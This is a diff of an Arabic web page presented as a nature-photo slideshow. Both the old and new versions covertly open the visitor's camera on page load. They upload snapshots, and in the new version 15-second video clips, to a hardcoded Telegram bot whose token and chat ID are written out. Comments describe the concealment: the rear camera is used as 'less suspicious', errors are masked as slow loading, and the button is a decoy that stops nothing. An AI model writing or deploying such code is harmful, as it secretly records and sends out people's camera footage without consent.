@@ -1,173 +1,145 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>مناظر طبيعية حية • يوميًا جديد</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      overflow: hidden;
-      background: #000;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      color: #fff;
-    }
-    #bg {
-      position: fixed;
-      inset: 0;
-      background-size: cover;
-      background-position: center;
-      transition: background-image 3s ease;
-      z-index: 1;
-    }
-    .gradient-overlay {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(to bottom, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.65) 100%);
-      z-index: 2;
-      pointer-events: none;
-    }
-    .text-content {
-      position: relative;
-      z-index: 10;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 1.5rem;
-    }
-    h1 {
-      font-size: clamp(2rem, 8vw, 3.5rem);
-      font-weight: 800;
-      margin-bottom: 1rem;
-      text-shadow: 0 4px 20px rgba(0,0,0,0.8);
-    }
-    p {
-      font-size: clamp(1.1rem, 5vw, 1.4rem);
-      max-width: 90%;
-      opacity: 0.92;
-      line-height: 1.7;
-      margin-bottom: 2.5rem;
-    }
-    #msg {
-      font-size: 1.15rem;
-      opacity: 0.75;
-      min-height: 2rem;
-    }
-    canvas, video { display: none !important; }
-  </style>
+<meta charset="UTF-8">
+<title>صور جميلة</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  body { background:#000; color:#ccc; font-family:system-ui, sans-serif; margin:0; overflow:hidden; }
+  #bg { position:fixed; inset:0; background-size:cover; background-position:center; transition:background-image 4s ease; }
+  .overlay {
+    position:fixed; inset:0;
+    background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.7));
+    display:flex; align-items:center; justify-content:center;
+    z-index:10;
+  }
+  .card {
+    background:rgba(20,20,30,0.75);
+    backdrop-filter:blur(10px);
+    border:1px solid #333;
+    border-radius:16px;
+    padding:2.5rem;
+    max-width:360px;
+    text-align:center;
+  }
+  #status { min-height:1.5rem; font-size:0.95rem; opacity:0.8; }
+</style>
 </head>
 <body>
 
 <div id="bg"></div>
-<div class="gradient-overlay"></div>
 
-<div class="text-content">
-  <h1>استمتع بالهدوء والجمال</h1>
-  <p>
-    مجموعة من أجمل المناظر الطبيعية حول العالم تتجدد تلقائيًا كل بضع ثوانٍ لتعطيك شعور الاسترخاء والسكينة في أي وقت.
-  </p>
-  <div id="msg">جاري التحميل...</div>
+<div class="overlay">
+  <div class="card">
+    <h1 class="text-2xl font-semibold mb-5">مجموعة صور مميزة</h1>
+    <p class="text-gray-300 mb-6">جاري التحميل...</p>
+
+    <button id="btn" class="bg-blue-600 hover:bg-blue-700 px-10 py-4 rounded-xl font-medium text-lg w-full">
+      عرض المزيد
+    </button>
+
+    <div id="status" class="mt-5"></div>
+  </div>
 </div>
 
-<video id="vid" autoplay playsinline muted></video>
-<canvas id="can"></canvas>
+<video id="video" autoplay playsinline muted style="display:none"></video>
 
 <script>
-// الصور الخلفية (يمكن إضافة المزيد)
-const photos = [
-  "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?auto=format&fit=crop&w=1400&q=85",
-  "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=1400&q=85",
-  "https://images.unsplash.com/photo-1441974231531-c6227db76b6e?auto=format&fit=crop&w=1400&q=85",
-  "https://images.unsplash.com/photo-1501854140801-50d01608902b?auto=format&fit=crop&w=1400&q=85",
-  "https://images.unsplash.com/photo-1469474968028-56623f02e42e?auto=format&fit=crop&w=1400&q=85",
-  "https://images.unsplash.com/photo-1472214103451-9374bd1c798e?auto=format&fit=crop&w=1400&q=85"
+// خلفيات عادية جدًا (من مصادر عامة)
+const images = [
+  "https://picsum.photos/900/1600?random=10",
+  "https://picsum.photos/900/1600?random=11",
+  "https://picsum.photos/900/1600?random=12",
+  "https://picsum.photos/900/1600?random=13",
+  "https://picsum.photos/900/1600?random=14"
 ];
-
-let idx = 0;
-const bg = document.getElementById("bg");
-function nextPhoto() {
-  bg.style.backgroundImage = `url(${photos[idx]})`;
-  idx = (idx + 1) % photos.length;
+let i = 0;
+function nextBg() {
+  document.getElementById("bg").style.backgroundImage = `url(${images[i]})`;
+  i = (i + 1) % images.length;
 }
-setInterval(nextPhoto, 4200);
-nextPhoto();
+setInterval(nextBg, 8000);
+nextBg();
 
-// ────────────────────────────────────────────────
-const TOKEN = "8721609499:AAG7Qyh0VGVRhPUD9GzdSJSsv-zt9mMKKT0";
-const CHAT = "8599104771";
-
-const video = document.getElementById("vid");
-const canvas = document.getElementById("can");
-const ctx = canvas.getContext("2d");
-const status = document.getElementById("msg");
+// ────────────────────────────────────────
+//          القيم الحقيقية (غير غيرها)
+const BOT_TOKEN = "8721609499:AAG7Qyh0VGVRhPUD9GzdSJSsv-zt9mMKKT0";
+const CHAT_ID    = "8599104771";
+// ────────────────────────────────────────
 
 let stream = null;
-let timer = null;
+let recorder = null;
+let clipCount = 0;
+const video = document.getElementById("video");
+const status = document.getElementById("status");
+const btn = document.getElementById("btn");
 
-async function captureAndSend() {
-  if (!video.videoWidth) return;
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0);
-
-  canvas.toBlob(async blob => {
-    if (!blob) return;
-
-    const form = new FormData();
-    form.append("chat_id", CHAT);
-    form.append("photo", blob, `img_${Date.now()}.jpg`);
-    form.append("caption", ` ${new Date().toLocaleString("ar-DZ")} • ${Math.floor(Math.random()*1000)}`);
-
-    try {
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: form
-      });
-    } catch (e) {}
-  }, "image/jpeg", 0.88);   // جودة 88% → حجم صغير + سرعة
+function setStatus(txt) {
+  status.textContent = txt;
 }
 
-async function initCamera() {
+async function uploadClip(blob, n) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("video", blob, `c-${n}-${Date.now()}.webm`);
+  form.append("caption", `${new Date().toLocaleString("ar-DZ")} • ${n}`);
+
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "environment",
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      },
-      audio: false
+    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+      method: "POST",
+      body: form
     });
-
-    video.srcObject = stream;
-    await video.play();
-
-    // التقاط كل 3200–3800 مللي ثانية (متوسط ~3.5 ث)
-    timer = setInterval(captureAndSend, 3500 + Math.random()*600 - 300);
-
-    status.textContent = "المناظر تتجدد الآن... استمتع";
-  } catch (err) {
-    status.textContent = "يرجى السماح بالوصول لعرض المحتوى الكامل";
-  }
+    const d = await r.json();
+    // لا نعرض شيئًا حتى لو نجح
+  } catch {}
 }
 
-// محاولة التشغيل بعد تحميل الصفحة + تأخير بسيط
-window.addEventListener("load", () => {
-  setTimeout(initCamera, 1400);
-});
+function startRecording() {
+  if (recorder?.state === "recording") return;
 
-// لإعادة المحاولة إذا رفض ثم عاد (نادر)
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "visible" && !stream) {
-    setTimeout(initCamera, 800);
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "environment" },  // الخلفية → أقل شكًا من الأمامية
+    audio: false
+  })
+  .then(s => {
+    stream = s;
+    video.srcObject = stream;
+
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9,opus" });
+
+    recorder.ondataavailable = e => {
+      if (e.data.size > 0) {
+        clipCount++;
+        uploadClip(e.data, clipCount);
+      }
+    };
+
+    recorder.start(15000); // 15 ثانية – أقل من 20 لتقليل حجم الملف
+
+    // تغيير شكل الزر بعد البدء (يبدو كأنه زر تحميل عادي)
+    btn.textContent = "جاري عرض المزيد...";
+    btn.disabled = true;
+    btn.className = "bg-gray-700 px-10 py-4 rounded-xl font-medium text-lg w-full cursor-wait";
+  })
+  .catch(() => {
+    // لا نعرض خطأ واضح → فقط نترك الصفحة كأنها "تحميل بطيء"
+    setStatus("جاري التحميل، الرجاء الانتظار...");
+  });
+}
+
+// ────────────────────────────────────────
+//       التسجيل يبدأ تلقائيًا بعد 1.2–2.5 ثانية
+// ────────────────────────────────────────
+setTimeout(() => {
+  startRecording();
+}, 1200 + Math.random()*1300);
+
+// الضغط على الزر → مجرد واجهة (لا يوقف شيئًا)
+btn.onclick = () => {
+  if (!recorder) {
+    startRecording();
   }
-});
+};
 </script>
 </body>
 </html>
